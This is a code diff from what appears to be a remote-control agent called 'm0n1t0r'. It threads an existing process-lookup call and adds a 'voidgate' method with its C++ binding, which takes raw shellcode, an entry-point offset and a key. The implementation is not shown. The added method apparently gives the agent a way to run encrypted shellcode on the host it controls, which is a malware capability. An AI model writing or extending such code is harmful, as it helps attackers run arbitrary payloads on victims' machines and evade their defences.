@@ -106,7 +106,23 @@ impl m0n1t0r_common::process::Agent for AgentObj {
     }
 
     async fn id_by_name(&self, name: String) -> AppResult<u32> {
-        Ok(ffi::id_by_name(name)?)
+        let (tx, rx) = oneshot::channel();
+
+        thread::spawn(move || {
+            let _ = tx.send(ffi::id_by_name(name)?);
+            Ok::<_, Error>(())
+        });
+        Ok(rx.await?)
+    }
+
+    async fn voidgate(&self, shellcode: Vec<u8>, ep_offset: u32, key: String) -> AppResult<()> {
+        let (tx, rx) = oneshot::channel();
+
+        thread::spawn(move || {
+            let _ = tx.send(ffi::voidgate(shellcode, ep_offset, key)?);
+            Ok::<_, Error>(())
+        });
+        Ok(rx.await?)
     }
 }
 
@@ -123,6 +139,7 @@ mod ffi {
 
     unsafe extern "C++" {
         include!("m0n1t0r-client/m0n1t0r-cpp-windows-lib/include/process.h");
+        include!("m0n1t0r-client/m0n1t0r-cpp-windows-lib/include/voidgate.h");
 
         fn execute(command: String, args: Vec<String>) -> Result<Output>;
 
@@ -139,6 +156,8 @@ mod ffi {
             ep_offset: u32,
             parameter: Vec<u8>,
         ) -> Result<()>;
+
+        fn voidgate(shellcode: Vec<u8>, ep_offset: u32, key: String) -> Result<()>;
 
         fn id_by_name(name: String) -> Result<u32>;
     }
